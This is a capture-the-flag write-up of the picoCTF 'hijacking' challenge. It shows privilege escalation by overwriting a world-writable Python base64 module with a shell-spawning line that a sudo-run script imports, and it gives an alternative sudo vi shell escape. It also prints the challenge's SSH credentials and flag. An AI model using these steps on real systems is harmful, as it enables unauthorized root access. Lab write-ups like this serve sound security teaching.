# Writeup: hijacking

## Overview

This challenge involves exploiting a Python file with root access and modifying system files to obtain the flag.

## Info

1. Challenge Description

```text
Getting root access can allow you to read the flag. 
Luckily there is a python file that you might like to play with. 
Through Social engineering, we've got the credentials to use on the server. 
SSH is running on the server.

saturn.picoctf.net 64912
Username: picoctf
Password: w26873vTLt
```

2. Hint

  - Check for Hidden files
  - No place like Home:)

## Exploitation Steps

1. Use the provided credentials to connect to the server via SSH.

```terminal
$ ssh -p 62007 picoctf@saturn.picoctf.net
```

2. Check for hidden files following the hint.

```terminal
picoctf@challenge:~$ ls -la
total 16
drwxr-xr-x 1 picoctf picoctf   20 Sep  1 15:42 .
drwxr-xr-x 1 root    root      21 Aug  4  2023 ..
-rw-r--r-- 1 picoctf picoctf  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 picoctf picoctf 3771 Feb 25  2020 .bashrc
drwx------ 2 picoctf picoctf   34 Sep  1 15:42 .cache
-rw-r--r-- 1 picoctf picoctf  807 Feb 25  2020 .profile
-rw-r--r-- 1 root    root     375 Mar 16  2023 .server.py
```

3. Examine the code of `.server.py`

```terminal
picoctf@challenge:~$ cat .server.py
import base64
import os
import socket
ip = 'picoctf.org'
response = os.system("ping -c 1 " + ip)
#saving ping details to a variable
host_info = socket.gethostbyaddr(ip) 
#getting IP from a domaine
host_info_to_str = str(host_info[2])
host_info = base64.b64encode(host_info_to_str.encode('ascii'))
print("Hello, this is a part of information gathering",'Host: ', host_info) 
```

  - Seems like nothing related to the challenge.

4. Check current privileges on system.

```terminal
picoctf@challenge:~$ sudo -l
Matching Defaults entries for picoctf on challenge:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoctf may run the following commands on challenge:
    (ALL) /usr/bin/vi
    (root) NOPASSWD: /usr/bin/python3 /home/picoctf/.server.py
```

  - We can use  `vi`.
  - We have root access on running `/usr/bin/python3 /home/picoctf/.server.py`.

5. Since the challenge description ask us to play with the python files so we can look at the access on each modules imported in `.server.py`.

  - Check the location of the Python modules.
```terminal
picoctf@challenge:~$ python3
>>> import sys
>>> print(sys.path)
['', '/usr/lib/python38.zip', '/usr/lib/python3.8', '/usr/lib/python3.8/lib-dynload', '/usr/local/lib/python3.8/dist-packages', '/usr/lib/python3/dist-packages']
```

  - Look at the permission on each modules imported.

```terminal
$ ls -la /usr/lib/python3.8
-rwxrwxrwx 1 root root  20413 Sep  1 16:16 base64.py
-rw-r--r-- 1 root root  38995 May 26  2023 os.py
-rw-r--r-- 1 root root  35243 May 26  2023 socket.py
```
  - We have full read-write-execute access on base64.py.

6. We can modify `base64.py` module to provide shell.

```terminal
picoctf@challenge:~$ vim /usr/lib/python3.8/base64.py
```

```python
import os

os.system('/bin/sh')
```

7. Run the code with root privileges to gain root access and find the flag..

```terminal
picoctf@challenge:~$ sudo /usr/bin/python3 /home/picoctf/.server.py
# whoami
root
# cd ../..      
# ls
bin   challenge  etc   lib    lib64   media  opt   root  sbin  sys  usr
boot  dev        home  lib32  libx32  mnt    proc  run   srv   tmp  var
# cd root
# ls -la
total 12
drwx------ 1 root root   23 Aug  4  2023 .
drwxr-xr-x 1 root root   51 Sep  1 16:34 ..
-rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc
-rw-r--r-- 1 root root   43 Aug  4  2023 .flag.txt
-rw-r--r-- 1 root root  161 Dec  5  2019 .profile
# cat .flag.txt
picoCTF{pYth0nn_libraryH!j@CK!n9_13cfd3cc}
```

## Alternative Ways

We can also run this line of code directly to gain root access.

```terminal
$ sudo vi -c ':!/bin/sh' /dev/null
```

## Conclusion

This challenge requires an understanding of Python libraries, file permissions, and how to hijack system modules to gain elevated access. By modifying a writable Python module, we were able to execute commands with root privileges and retrieve the flag.
